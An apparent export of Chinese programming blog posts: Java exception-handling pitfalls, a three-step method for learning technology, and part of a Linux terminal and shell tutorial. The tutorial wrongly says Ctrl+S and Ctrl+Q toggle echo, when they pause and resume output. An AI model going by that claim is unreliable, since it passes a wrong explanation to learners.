在语言层面提供了内存的垃圾回收机制，程序员只管申请内存，不需要再关心释放的问题。因此很多新手养成了坏习惯，对于其它资源（比如数据库连接）也只申请不释放（有些人甚至天真地以为 JVM 会帮你搞定资源回收）。 还有些人虽然知道资源需要释放，但是常常忘记（比如写了打开数据库连接和相关代码，【即将】写关闭数据库连接时，突然有人叫你去吃中饭，回来后就把这茬给忘了）。 这个坏习惯会导致资源的泄露，而资源泄露往往比内存泄露更要命。如果你写的程序是长时间运行的（比如运行在 Web Server 上），时间长了会由于资源耗尽而导致整个进程出问题。 异常处理不当上文讨论了“编程习惯的问题”，今天来聊聊关于异常处理的话题。 ★空的 catch 语句块 犯这种错误的人比较少，一般发生在刚学会 Java 或者刚参加工作不久的人身上。 所谓“空 catch 语句块”就是在 catch 语句块中没有对异常作任何处理（比如记错误日志），导致异常信息被丢弃/忽略。一旦程序不能正确运行，由于查不到任何 log 信息，只好从头看代码，靠肉眼找 bug。 ★没有使用 finally 很多人在 catch 语句之后不使用 finally 语句。由于在 try 语句中可能会涉及资源的申请和释放。如果在资源申请之后、资源释放之前抛出异常，就会发生资源泄露。 （资源泄露的严重性，上文已经聊过了） ★笼统的 catch 语句块 有些人为了省事，只在自己模块的最外层代码包一个 try 语句块，然后 catch(Exception)。不管捕获到什么异常，都作统一 log 了事。这种做法比“空 catch 语句块”稍好，但由于不能对具体的异常进行具体处理，对一些可恢复的异常（下面会提到），丧失了恢复的机会。而且也可能导致上述提到的资源泄露的问题。 ★使用函数返回值进行错误处理 有些人放着 Java 的异常机制不用，而用函数返回值来表示成功/失败（比如：返回 true 表示成功、false 表示失败），简直是“捧着金碗要饭”。个人感觉，从 C 转到 Java 的人比较容易有此毛病。这种做法会导致如下几个问题：\\1. 返回值一般用整数值或布尔值表示，传递的信息过于简陋；\\2. 一旦调用者忽略了错误返回码，就会导致和“空 catch 语句块”类似的问题；\\2. 对同一个函数的多处调用，都需要对返回值进行重复判断，导致代码冗余（代码冗余的坏处，上文也已经聊过了）。 ★不清楚“Checked Exception”和“Runtime Exception”的区别 这个现象比较普遍，俺发现很多2年以上 Java 工作经验的人尚未完全搞明白两者的区别。看来这个问题得详细说一下。当初Java的设计者有意区分这两种异常，是别有深意的。其中“Checked Exception”用于表示可恢复的异常（也就是你必须检查的异常）；而“Runtime Exception”表示不可恢复的异常（也就是运行时异常，主要是程序 bug 和致命错误，你【不需要】检查）。不过这种做法引来了很多争议（包括很多 Java 大牛），鉴于本帖子主要针对新手，以后再专门来聊这个争议的话题。 为了便于理解，下面我举一个例子来说明。假设你要写一个 Download 函数，根据传入的 URL（String 参数）返回对应网页的内容文本。这时候有两种情况你需要处理：\\1. 如果传入的 URL 参数是 null，这表明该函数的调用者出 bug 了，而程序本身的 bug 是很难在运行时自我恢复的。这时候 Download 函数必须抛出 Runtime Exception。并且 Download 函数的调用者【不应该】尝试去处理这个异常，必须让它【尽早】暴露出来（比如让 JVM 自己终止运行）。\\2. 如果传入的 URL 参数非 null，但是它包含的字符串不是一个合法的URL格式（可能由于用户输入错误导致）。这时候 Download 函数必须抛出 Checked Exception。并且 Download 函数的调用者必须捕获该异常并进行相应的处理（比如提示用户重新输入 URL）。 上面就是几种常见的Java异常处理的误用。下一次我们来聊一下“对虚拟机（JVM）了解不足”。 对JVM缺乏了解上文讨论了Java异常机制的几种误用，今天咱们来说说 JVM（以及 Java 编译器）相关的话题。为啥要聊 JVM 捏？因为有很多 Java 程序员，由于对 JVM 缺乏了解，在碰到某些技术问题时无从下手；另外，由于缺乏对 JVM 的了解，可能导致写出来的代码性能巨差或者有严重的 Bug。对于一个 Java 程序员来说，你不一定要非常清楚 JVM 的细节，但是对于一些关键的运作机制，还是要掌握大致的概念。 按照本系列的惯例，俺会问几个和 JVM 相关的问题，你如果对这些问题不是很明白，那得考虑花点时间去了解一下了。另外，鉴于有网友批评“本系列”帖子：光诊断毛病，不开出药方。（说得很形象，也很中肯）俺会针对下面提出的问题，写一些帖子来解答。 ★关于基本类型和引用类型很多新手不理解Java的基本类型和引用类型在本质上有什么区别。请看如下的问题：◇这两种类型在内存存储上有什么区别？◇这两种类型在性能上有什么区别？◇这两种类型对于 GC 有什么区别？ ★关于垃圾回收（Garbage Collection） 很多新手不理解 GC 的实现机制。请看如下的问题：◇GC 是如何判断哪些对象已经失效？◇GC 对性能会有哪些影响？◇如何通过 JVM 的参数调优 GC 的性能？ ★关于字符串 对于 Java 提供的 String 和 StringBuilder，想必很多人都知道：String 用于常量字符串，StringBuilder 用于可变字符串。那 Java 当初为什么要这样设计捏？为啥不用一个类来统一搞定捏？ ★关于范型（Generic Programming） 从 JDK 1.5开始，Java 引入了一个重量级的语法：范型。不过捏，很多新手仅仅知道范型的皮毛，而对于很多本质的东东，不甚了解。◇GP 是在编译时实现的还是在运行时实现的？为什么要这么实现？◇GP 的类型擦除机制是咋回事？有啥优点/缺点？◇使用范型容器（相对于传统容器）在性能上有啥影响？为什么？ ★关于多线程 另外，多线程也是大部分 Java 新手的短板。所以俺最后再来提几个关于多线程的问题。◇synchronized 关键字是怎么起作用滴？◇synchronized 的颗粒度（或者说作用域）如何？是针对某个类还是针对某个类对象实例？◇synchronized 对性能有没有影响？为什么？◇volatile 关键字又是派啥用滴？啥时候需要用这个关键字捏？","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"java","slug":"java","permalink":"http://1905060202.github.io/tags/java/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"学习技术三部曲","date":"2021-07-16T15:31:58.000Z","path":"2021/07/16/学习技术三部曲/","text":"学习技术的三部曲：WHAT、HOW、WHY文章目录 ★第一步：WHAT★第二步：HOW★第三步：WHY 最近几天有些网友在邮件里面问我关于学习的问题。有好几个人觉得工作了几年，也学会了不少的类库、框架、甚至语言，但是感觉自己的能力没有太大的提高。因此今天来说一下我个人对这方面的体会，希望对大伙儿（尤其是新手）有帮助。 先声明一下，本帖子讨论的三部曲是指你已经选定了某个技术方向之后，该如何学习；至于如何选定技术方向，则属于另一个话题，不在今天的讨论之列。 我把学习归类为三个步骤：What、How、Why。经过我对周围同事和朋友的观察，大部分感觉自己技术没有提高的人，都仅仅停留在 WHAT 阶段。下面我把这三个步骤解释一下。 ★第一步：WHAT 所谓的“WHAT”也就是“What is it?”——这是最简单的层次。在这个层次，你要搞清楚某个东东是【什么】样子的？有【什么】用处？有【什么】特性？有【什么】语法？…… 举例如下： 对于学习语言（比如 C++、Java、Python），大部分人都能够掌握基本的语法和标准库，然后用它写一些小程序（诸如二分查找、冒泡排序、简单文件操作等）。对于学习类库（比如 JDBC 类库），大部分 Java 程序员都能明白 JDBC 主要包含哪些类，也能够用 JDBC 进行简单的数据库查询和增删改操作。 由于这个步骤是最基本的，假如你连这都做不到（可能你的理解力不够好），也别在 IT 行业混了。 但是光会 What 是不够的。仅仅停留在这个步骤，导致了很多程序员【只知其然，不知其所以然】。这就是目前大部分开发人员的现状。 ★第二步：HOW 所谓的“HOW”就是“How to do?”。在这个层次，你要搞清楚某个东西，其内部是【如何】运作的？【如何】实现的？…… 举例如下： 假如你在学习 C++ 语言，你是否搞明白函数传参数的实现机制？虚函数是如何实现？抛出异常时的栈回退是怎么回事？……假如你在学习 Java 语言，你是否搞清楚 GC 如何实现？反射是如何实现？……假如你在学习 JDBC 库，你是否清楚 JDBC Driver 的4种类型？不同游标类型的实现机制？事务的机制？…… 在这个阶段，你必须多想想类似这些问题。然后通过各种途径（参见“关于自学能力”的几个方法），把问题彻底搞清楚。自然而然，你的提高就会比较明显。而且如果碰到一些深层次的问题（比如性能优化），也就知道该如何去解决。 完成这个阶段之后，你基本上就属于该技术领域最优秀的20%的人（根据二八原理，80%的人不会去思考 HOW 的问题）。 ★第三步：WHY 一般来说，只有想清楚 HOW 之后，才能继续去考虑 WHY。 所谓的“WHY”，就是搞清楚某个东西【为什么】设计成这样？【为什么】不是另外的样子？这样的设计有什么讲究？…… 说实在的，善于问“为什么”有一定的天赋成分？好像某个科学大牛曾经说过“提出问题有时候比解决问题更难”。一般来说，只有当你【深刻理解】了某个东西，才能够针对这个东东的【设计】问出一些问题。所以，我前面强调过，要先把 HOW 的问题搞清楚，再来考虑 WHY 的问题。 举例如下： 对于C++语言：为什么 C++ 没有类似 Java 的 finally 关键字？为什么当初发明 C++ 的时候没有考虑 GC？……对于Java语言：为什么 Java 没有类似 C++ 的类析构函数？为什么 Java 要同时提供 String 和 StringBuffer 两个似乎冗余的类？……对于Python语言：为什么 Python 不提供类似 C++/Java 的访问控制机制？…… 如果你能够【自己】问出诸如上述的“为什么”问题，并且能够通过各种途径找到解答，那你基本上已经吃透这个技术了，并且你已经【有可能】自己去【设计】一个类似的玩意儿了。到这时，你已经踏上了通向技术高手的康庄大道。 由于本博客偏重 IT 方面，所以今天举的这些例子多半都是 IT 相关的。但这个“三部曲”在 IT 之外的行业和领域，其实也适用。如何举一反三，就看各位的悟性了。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"},{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"Linux&命令行","date":"2021-07-16T13:48:51.000Z","path":"2021/07/16/Linux-命令行/","text":"扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”文章目录 ★引子★本文目标读者★一切都从【电传打字机】开始说起★终端（terminal/TTY）★终端的3种【缓冲模式】——字符模式、行模式、屏模式★终端的【回显】★（早期的）系统控制台/物理控制台（system console）★（如今的）虚拟控制台（virtual console）★终端模拟器（terminal emulator）★伪终端（PTY/pseudotty/pseudoterminal）★shell——命令行解释器★shell 的基本功能★进程的启动与退出★“进程控制”与“信号”★作业控制（job）★环境变量（environment variable）★“标准流”（standard stream）与“重定向”（redirection）★匿名管道（anonymous pipe）★批处理（batch）★shell 脚本★结尾 ★引子 首先， 这篇是为了补前几年的“欠债”。这些年，俺写了好多篇 Linux 相关的技术教程。但还从来没有【系统性】地介绍 Linux 命令行相关的基本概念和基本知识。几年来，已经有不少读者催俺填上这个大坑，但俺比较懒，一直拖到现在，惭愧 :( ★本文目标读者 虽然本文的标题号称是【扫盲】，但俺相信：即使是一些 POSIX 系统的命令行【老手】，对本文中介绍的某些概念，可能也会有【欠缺】。 因此，这篇教程既适合于命令行的新手，也值得某些【老手】看一看。 由于本文介绍的是 POSIX 系统中【通用的】概念与知识。因此，包括 Linux、BSD 家族、macOS 等各种系统的用户，应该都能从中受益。 （注：POSIX 是某种操作系统的标准/规范。各种 Linux 发行版以及所有的 UNIX 变种，包括 macOS，都属于“POSIX 系统”） 如果你是这方面的【菜鸟】，并且想要掌握这个领域。【不要】企图只看一遍就完全理解本文的内容（可能需要看好几遍）。俺的建议是：要一边看，一边拿命令行的环境【实践】一下。 ★一切都从【电传打字机】开始说起 （说完了“引子”与“目标读者”，开始切入正题） 可能有些读者会纳闷——“聊命令行的基本概念”，为啥要扯到“电传打字机”？是不是扯得太远了？ 俺来解释一下： IT 行业的很多基本概念都来自于【历史遗迹】。有时候你觉得某些东西很奇怪（并纳闷“为啥会设计成这样”）；而当你搞清楚历史的演变过程之后，自然就明白其中的原因。 ◇在那遥远的【电报时代】 在计算机诞生之前（二战前），【电报】属于高科技的玩意儿——它能够瞬间把信息传送到另一个城市（甚至传送到大洋彼岸）。 当年的电报线路，是以【字符】为单位发送信息。在线路两端使用【电传打字机】，就可以自动地把对方发过来的字符打印出来。 （上世纪40年代的电传打字机——用于电报网） ◇“回车/换行”的来历 稍微懂点 IT 的同学，应该都听说过“回车/换行”，洋文分别称之为“carriage return”＆“line feed”。在编程领域，这两个字符简称为 \\r ＆ \\n。 为啥会有这么两个玩意儿捏？ 因为在电传打字机时代，当打印完一行之后，需要用一个控制命令把“打印头”复位（移到打印纸的左边），然后再用另一个控制命令把“打印头”往下移动一行。很自然地，这俩动作就对应了两个控制字符（CR ＆ LF），也就是所谓的“回车 ＆ 换行”。 ◇其它控制字符 如果你去留意一下 ASCII 字符表的开头部分，前面那32个字符都是控制字符，很多都源于遥远的【电报时代】。 在本文后续的介绍中，还会再聊到这些“控制字符”。 ★终端（terminal/TTY）◇历史演变 “终端”一词，洋文称之为“terminal”。有时候又被称作 TTY，而 TTY 这个简写就来自刚才介绍的【电传打字机】（teletype printer）。 因为早期的大型机，其“终端”就是【电传打字机】。那时候的终端，也称作【硬件终端】。 为啥会有“终端”这个概念捏？你依然需要了解历史的变迁。 最早期的计算机（大型机）是【单任务】滴——也就是说，每次只能干一件事情。 到了60年代，出现了一个【革命性】的飞跃——发明了【多任务】系统，当时叫做“time-sharing”（分时系统）。有了“分时系统”，就可以让多个人同时使用一台大型机。而为了让多个人同时操作这台大型机，就引入了【终端】的概念。每一台大型机安装多个终端，每个操作员都在各自的终端上进行操作，互不干扰。 ◇（跑题）“约翰·麦卡锡”其人 聊到这里，稍微跑题一下： 最早的“分时系统”由 IT 超级大牛“约翰·麦卡锡”（John McCarthy）设计。此人不仅仅是“分时系统它爹”，还是“Lisp 语言它爹”，另外还参与设计了编程语言“ALGOL 60”。而这个“ALGOL 60”编程语言虽然知道的人不多，但该语言深刻影响了后续的 Ada、BCPL、C、Pascal…… 为了让你体会这只大牛到底有多牛。俺引用另一个牛人保罗·格雷汉姆（《黑客与画家》作者）的观点——他认为在所有编程语言中， Lisp 与 C 是两座无法超越的高峰。而“约翰·麦卡锡”亲自发明了 Lisp 语言，然后又深刻地影响了 C 语言。 另外，麦卡锡这只大牛还参与创立了“MIT 人工智能实验室”与“斯坦福人工智能实验室”。前者涌现出一大批早期的黑客，其中包括大名鼎鼎的 Richard Stallman（此人开创了：自由软件运动、GNU 社区、GCC、GDB、GNU Emacs ……）。 （超级大牛约翰·麦卡锡） ◇【远程】终端 跑题结束，言归正传。 “终端”的好处不光是“多任务”，而且还可以让用户在【远程】进行操作。这种情况下，“终端”通过 modem（调制解调器）与“主机”相连。这种玩法很类似于——互联网普及初期的拨号上网。示意图如下： （通过 modem 实现的【远程】终端） 最早的“终端”，本质上就是“电传打字机”——以“打字机”作为输入；以“打印纸”作为输出。这类终端，比较经典的是如下这款： （Teletype Model 33 ASR） 到了上世纪70年初，终于有了带【屏幕】的远程终端。DEC 公司的 VT05 是第一款基于 CRT 显示器的远程终端。 （VT05 终端） ◇内部结构示意图 下面这张是大型机时代，“终端”与“进程”通讯的示意图。 图中的 UART 是洋文“Universal Asynchronous Receiver and Transmitter”的缩写（相关维基百科链接在“这里”）。LDISC 是洋文“line discipline”的简写（相关维基百科链接在“这里”）。 通俗地说，UART 用来处理物理线路的字符传输（比如：“错误校验”、“流控”、等）；LDISC 用来撮合底层的“硬件驱动”与上层的“系统调用”，并完成某些“控制字符”的处理与翻译。 （TTY 示意图1：使用【硬件终端】的大型机内部结构图） ◇如今的含义 如今，“终端”一词的含义已经扩大了——用来指：基于【文本】的输入输出机制。 在本文后续的章节中， terminal 与 TTY 这两个术语基本上是同义词。 ★终端的3种【缓冲模式】——字符模式、行模式、屏模式◇字符模式（character mode） 又要说回到【电传打字机】。 在本文开头，已经聊过这个玩意儿，并且提到——它是基于【字符】传输滴。也就是说，操作员每次在“电传打字机”上按键，对应的字符会立即通过线路发送给对方。这就是最传统的【字符模式】 通俗地说，“字符模式”也就是【无缓冲】的模式。 ◇行模式（line mode） 不客气地说，“字符模式”是非常傻逼滴！因为如果你不小心按错键，这个错误也会立即发送出去。 比如说，你在输入一串很长的命令，结果输到半当中，敲错一个按键，整个命令就废了——要重新再输入一遍。 所以，当早期的程序员对“字符模式”实在忍无可忍之后，终于发明了【行模式】。 【行模式】也叫做“行缓冲”。也就是说，终端会把你当前输入的这行先缓冲在本地。只有当你最终按了【回车键】，才会把这一整行发送出去。如果你不小心敲错了一个字符，可以赶紧用“退格键”删掉重输这个字符。 因此，这种模式称之为【行缓冲】。 顺便说一下： 早期的标准键盘，【没有】方向键（“上下左右”这4个键）。不信的话，可以去看本文前面贴的那张“Teletype Model 33 ASR”的照片。 因为无论是“字符模式”还是“行模式”，都没这个需求。 ◇屏模式（screen mode/block mode） “行模式”进一步的发展就是【屏模式】。这个玩意儿也叫“全屏缓冲”，顾名思义，终端会缓冲当前屏幕的内容。 在这种模式下，用户可以利用方向键，操纵光标（cursor）在屏幕上四处游走。 开发这种类型的软件，比较复杂——程序员至少需要做如下工作：\\1. 保存整个屏幕的状态\\2. 根据键盘输入，操纵光标（cursor）移动\\3. 控制屏幕的哪些区域是光标可达，哪些是不可达；\\4. 对于光标可达的部分，控制哪些是“可编辑”，哪些是“只读”；\\5. 根据“光标移动”以及某些“特定的按键”（比如“翻页键”），重新绘制屏幕…… 后来，为了简化”屏模式“的编程，专门搞了一个叫做 curses 的编程库。如今的“ncurses 库”就是从 curses 衍生出来滴（前面加了一个 n 表示 new）。 （“重编译 Linux 内核”的配置界面，基于 ncurses 实现） 前面说了——早期的键盘【没】方向键。有了这个【屏模式】之后，键盘上才开始增加了“方向键”（所以“方向键”位于键盘的扩展区） ◇小结 上述这三种模式，第1种基本淘汰（仅限于极少数场景）；第3种用得也不多。与本文关系比较密切的，其实是【第2种】——行模式。 为了加深你的印象，用 cat 命令来举例（注：这个命令其实与“猫”【无关】，而是 concatenate 的简写） 大部分情况下，都是用它来显示某个文件的内容，比如说：cat 文件名 。但如果你运行 cat【没】加任何参数，那么它就会尝试读取你在终端的输入，然后把读到的文本再原样输出到终端。 （动画：演示“行模式”的效果） 在上述动画中，你的输入并【没有】直接传递给 cat 进程。要一直等到你按下【回车键】，cat 进程才收到你的输入，并立即打印了输出。 ★终端的【回显】◇“回显”是啥？ 在刚才那个 gif 动画中，当俺逐个输入 test 的每个字母，这些字母也会逐个显示在屏幕上。这种做法叫做【回显】。 ◇“回显”的打开与关闭（启用/禁用） 虽然“回显”很人性化，但某些特殊的场合是【不想】“回显”滴，比如当你输入密码/口令的时候。 因此，终端提供了某种机制，使得程序能够控制“回显”的启用/禁用。 对于大多数终端，可以用【Ctrl + S】禁用“回显”，然后用【Ctrl + Q】启用“回显”。 如果你在禁用“回显”的情况下输入一些文本，当你重新启用“回显”的瞬间，这些文本会一起出现在屏幕上。 顺便说一下： 由于【Ctrl + S】在 Windows 上是很常见的组合键。某些菜鸟刚开始玩 Linux 命令行的时候，会习惯性地按这个组合键，结果就禁用了回显。这时候，任何键盘输入都没有反应。菜鸟就以为终端死掉了。 ◇历史演变 对于 Windows 用户来说，【Ctrl + S】实在太常用了，很容易误按。肯定有大量的用户吐槽过 POSIX 终端的这个快捷键。 那么，为啥要用这两个快捷键来控制“回显”捏？俺又要第 N 次说到【电传打字机】了。 由于这玩意儿的输出是【打印纸】，其速率比较【慢】。一旦“对方发送字符的速率”高于“自己这边的打印速率”，就需要向对方发一个控制信号，让对方暂停发送；等到自己这边打印完了，再发送另一个控制字符，通知对方继续。 （注：上述这种玩法，通信领域行话称之为“流量控制/流控”） 当年用来表示“暂停发送”的控制字符，对应的就是【Ctrl + S】；用来“恢复发送”的控制字符，也正是【Ctrl + Q】。 ★（早期的）系统控制台/物理控制台（system console） （前面说了）在【没】发明“分时系统”之前，当时的计算机只能执行【单任务】。因此，那时候的大型机只有【一个】操作界面，称之为【控制台】。 话说那时的“控制台”，真的是一个台子（参见下图）。 （上世纪50年代，IBM 公司 704 大型机的控制台） 后来发明了“分时系统”。如刚才所说——“分时系统”使得大型机可以具备多个终端。在这种情况下，你可以把“控制台”通俗地理解为“本地终端”，而【不】是“控制台”的那些终端，称之为“远程终端”。 在那个年代，计算机属于【非常非常稀缺】的资源。于是拥有大型机的公司，就可以【出租计算资源】，获得一笔相当可观的收入。他们把大型机的某个“远程终端”租给外来人员使用，然后根据“时间/空间”收取费用。由于资源的稀缺性，当年的 CPU 是按【秒】计费，而内存是按【KB】计费。 由于“远程终端”可能会被【外人】使用，因此对“远程终端”的【权限】要进行一些限制。如果要进行一些高级别的操作（比如“关闭整个系统”），就只能限制在【控制台】（本地终端）进行。有些公司为了安全起见，还会把“控制台”单独锁在某个“secured room”里面。 （上世纪60年代，DEC 公司 PDP-7 小型机的控制台） ★（如今的）虚拟控制台（virtual console） 到了 PC 时代，传统意义上的【控制台】已经看不到了。但 console 这个术语保留了下来。 ◇从“物理 console”到“虚拟 console” 早期大型机的 console 是【独占】硬件滴——“键盘/显示器”固定用于某个 console 滴。 【现代】的 POSIX 系统，衍生出“virtual console”的概念——可以让几个不同的 console【共用】一套硬件（键盘/显示器）。“virtual”一词就是这么来滴。 再重复唠叨一下：不论是早期的“物理控制台”还是后来的“虚拟控制台”，都属于广义上的“终端”。 ◇举例：Linux 的 virtual console 假设你的 Linux 系统没安装图形界面（或者默认不启用图形界面），当系统启动完成之后，你会在屏幕上看到一个文本模式的登录提示。这个界面就是 virtual console 的界面。 在默认情况下，Linux 内置了【6个】virtual console 用于命令行操作，然后把第7个 virtual console 预留给图形系统。你可以使用 Alt + Fn 或 Ctrl + Alt + Fn 在这几个 console 之间切换（注：上述所说的 Fn 指的是 F1、F2… 之类的功能键）。 ◇虚拟控制台的【内部结构】（TTY 示意图2：【虚拟控制台】的内部结构图） ★终端模拟器（terminal emulator） 请注意上面那张示意图，图中出现了一个【终端模拟器】，这就是本章节要说的东东。 如果你对比前面的【TTY 示意图1】与【TTY 示意图2】的变化，会发现——“UART ＆ UART 驱动”没了，然后多了这个【终端模拟器】。 多出来的这个玩意儿相当于加了一个【抽象层】，模拟出早期硬件终端的效果，因此就【无需改动】系统内核中的其它部分，比如：LDISC（line discipline） 请注意，这个场景下的“终端模拟器”位于操作系统【内核】。换句话说，它属于【内核态】的模拟器。正是因为它处于这个地位，所以能够在“驱动”＆“LDISC”之间进行协调。 ★伪终端（PTY/pseudotty/pseudoterminal）◇从“文本模式”到“图形模式” 前面讲的那些，都是【文本模式】（文本界面）。 话说到了上世纪80年代，随着【图形界面】的兴起，就出现某种需求——想在图形界面下使用“【文本】终端”。于是就出现了“伪终端”的概念。 通俗地说，“伪终端”就是用某个图形界面的软件来模拟传统的“文本终端”的各种行为。前面说了，TTY 这个缩写相当于“终端”的同义词；因此“pseudotty” 就衍生出 PTY 这个缩写。 ◇从“【内核态】终端模拟器”到“【用户态】终端模拟器” 在上一个章节中，emulator 运行在系统内核中，因此是“内核态模拟器”； 等到后来搞“伪终端”的时候，就直接把这个玩意儿从【内核态】转到【用户态】——让它直接运行在【桌面环境】。如此一来，用户就可以直接在桌面环境中使用“终端模拟器”。 当“终端模拟器”变为【用户态】，它就【无法】直接与“键盘驱动 or 显卡驱动”打交道。在这种情况下，由“GUI 系统”（比如：X11）负责与这些驱动打交道，然后再把用户的输入输出转交给“终端模拟器”。 下面这张示意图是 xterm。别看它长得丑，它的出现也算是“里程碑”了。 （xterm——“图形化终端模拟器”的祖师爷） ◇内部结构示意图 很多人把“emulator”与“PTY”混为一谈。实际上两者处于【不同】层次。 在操作系统内部（内核），PTY 分为两部分实现，分别叫做“PTY master” ＆ “PTY slave”。master 负责与“terminal emulator”打交道；而用户通过 emulator 里面的 shell 启动的其它进程，则与 slave 打交道。 在这个环节中，“PTY slave”又进一步缩写为“PTS”。如果你用 ps 命令查看系统中的所有进程，经常会看到 PTS 之类的字样，指的就是这个玩意儿。对普通用户而言，看到的是“终端模拟器”的界面，至于 PTY 内部的 master ＆ slave，通常是感觉不到滴。 为了让大伙儿更加直观，再放一张 PTY 的结构示意图。 （TTY 示意图3：【伪终端】的内部结构图） ★shell——命令行解释器 费了好多口水，咱们终于聊到 shell 了。 顺便吐槽一下： 扫盲命令行的教程，很少会像俺这样，从最基本的概念说起。其导致的后果就是——很多人（甚至包括很多 Linux 程序员）都搞不清“shell、terminal、console、TTY、PTY、PTS”这些概念到底有啥区别。 在《如何【系统性学习】——从“媒介形态”聊到“DIKW 模型”》一文中，俺特别强调了【基本概念/基础知识】的重要性。这也就是俺为啥前面要费这么多口水的原因。 ◇shell VS terminal 前面所说的“终端”（terminal），本质上是：基于【文本】的输入输出机制。它并【不】理解具体的命令及其语法。 于是就需要引入 shell 这个玩意儿——shell 负责解释你输入的命令，并根据你输入的命令，执行某些动作（包括：启动其它进程）。 ◇常见 shell 举例 常见的 shell 包括如下这些（为避免排名纠纷，按字母序列出）： bashcshfishkshzsh 在维基百科的“这个页面”，列出了各种各样的 shell 及其功能特性的对照表。 如今影响力最大的 shell 是 bash（没有之一）。其名称源自“Bourne-again shell”，是 GNU 社区对 Bourne shell 的重写，使之符合自由软件（GPL 协议）。 本文后续章节对 shell 的举例，如果没有做特殊说明，均指 bash 这个 shell。 ★shell 的基本功能◇显示【命令行提示符】 当你打开一个 shell，会看闪烁的光标左侧显示一个东东，那个玩意儿就是【命令行提示符】（参见下图） （截图中的“命令行提示符”包含了：用户名、当前路径、$分隔符） 很多 shell 的“命令行提示符”都会包含【当前路径】。当你用 cd 命令切换目录，提示符也会随之改变。这有助于你搞清楚当前在哪个目录下，可以有效避免误操作。 下面这张图演示了——“命令行提示符”随着当前目录的变化而变化。 大部分 shell 都可以让你自定义这个【命令行提示符】，使之显示更多的信息量。 比如说，可以让它显示：当前的时间、主机名、上一个命令的退出码…… （注：如果你需要开多个【远程】终端，去操作多个【不同】的系统，“主机名”就蛮有用） ◇解析用户输入的【命令行】 假设你想看一下 /home 这个目录下有哪些子目录，可以在 shell 中运行了如下命令： 1ls /home 当你输入这串命令并敲回车键，shell 会拿到这一行，然后它会分析出，空格前面的 ls 是一个外部命令，空格后面的 /home 是该命令的参数。 然后 shell 会启动这个外部命令对应的进程，并把上述参数作为该进程的启动参数。 ◇内部命令 VS 外部命令 （刚才提到了【外部命令】这个词汇，顺便解释一下） 通俗地说，“内部命令”就是内置在 shell 中的命令；而“外部命令”则对应了某个具体的【可执行文件】。 当你在 shell 中执行“外部命令”，shell 会启动对应的可执行文件，从而创建出一个“子进程”；而如果是“内部命令”，就【不】产生子进程。 那么，如何判断某个命令是否为“外部命令”捏？ 比较简单的方法是——用如下方式来帮你查找。如果某个命令能找到对应的可执行文件，就是“外部命令”；反之则是“内部命令”。 1whereis 命令名称 ◇翻译【通配符】 玩过命令行的同学，应该都知道：“星号”（*）与“问号”（?）可以作为通配符，用来模糊匹配文件名。 当你在 shell 中执行的命令包含了上述两个通配符，实际上是 shell 先把”通配符“翻译成具体的文件名，然后再传给相应命令。 ◇翻译某些【特殊符号】 比如说：在 POSIX 系统中，通常用 ~ 来表示当前用户的【主目录】（home 目录）。 如果你在 shell 中用到了 ~ 这个符号，shell 会先把该符号翻译成“home 目录的【全路径】”，然后再传给相应命令。 ◇翻译【别名】 很多 POSIX 的 shell 都支持用 alias 命令设置别名（把一个较长的命令串，用一个较短的别名来表示）。 设置了别名之后，当你在 shell 中使用“别名”，由 shell 帮你翻译成原先的命令串。 举例：俺使用如下命令创建了 nc-tor 这个别名。 1alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:9050&#x27; 设置完之后，当你在 shell 中执行了这个 nc-tor 命令，shell 会把它自动翻译成 nc -X 5 -x 127.0.0.1:9050 ◇历史命令 大部分 shell 都会记录历史命令。你可以使用某些设定的快捷键（通常是【向上】的方向键），重新运行之前执行过的命令。 ◇自动补全 很多 shell 都具备自动补全的功能。 该功能不仅指“命令”本身的自动补全，还包括对“命令的参数”进行自动补全。 ◇操作“环境变量” 关于这部分，在下面的“环境变量”章节单独聊。 ◇“管道”与“重定向” 关于这部分，在下面的“管道”章节单独聊。 ◇“进程控制”与“作业控制” 关于这部分，在下面的“进程控制”与“作业控制”章节单独聊。 ★进程的启动与退出◇进程的【启动】及其【父子关系】 一般来说，每个“进程”都是由另一个进程启动滴。如果“进程A”创建了“进程B”，则 A 是【父进程】，B 是【子进程】（这个“父子关系”很好理解——因为完全符合直觉） 有些同学会问，那最早的【第一个】进程是谁启动滴？ 一般来说，第一个进程由【操作系统内核】（kernel）亲自操刀运行起来；而 kernel 又是由“引导扇区”中的“boot loader”加载。 ◇进程树 在 POSIX 系统（Linux ＆ UNIX），所有的进程构成一个【单根树】的层次关系。进程之间的“父子关系”，体现在“进程树”就是树上的【父子节点】。 你可以使用如下命令，查看当前系统的“进程树”。 1pstree （“进程树”的效果图。注：为了避免暴露俺的系统信息，特意【不】用自己系统的截图） ◇初始进程 一般情况下，POSIX 系统的“进程树”的【根节点】就是系统开机之后【第一个】创建的进程，并且其进程编号（PID）通常是 1。这个进程称之为“初始进程”。 （注：上述这句话并【不够】严密——因为某些 UNIX 衍生系统的“进程树”，位于根节点的进程【不是】“初始化进程”。这种情况与本文的主题没太大关系，俺不打算展开讨论） 对于“大部分 UNIX 衍生系统”以及“2010年之前的 Linux 发行版”，系统中的“初始进程”名叫 init； 如今越来越多的 Linux 发行版采用 systemd 来完成系统引导之后的初始化工作。在这些发行版中，“初始进程”名叫 systemd。 你可以用如下命令显示“进程树”中每个节点的“进程编号”（PID），然后就能看到编号为 1 的“初始进程”。 1pstree -p ◇进程的三种死法 关于进程如何死亡，大致有如下三种情况： 自然死亡 如果某个进程把它该干的事情都干完了，自然就会退出。 这种是最常见的情况，也是最优雅的死法。俺习惯称作【自然死亡】。 自杀 如果某个进程的工作干到半当中，突然收到某个通知，让它立即退出。 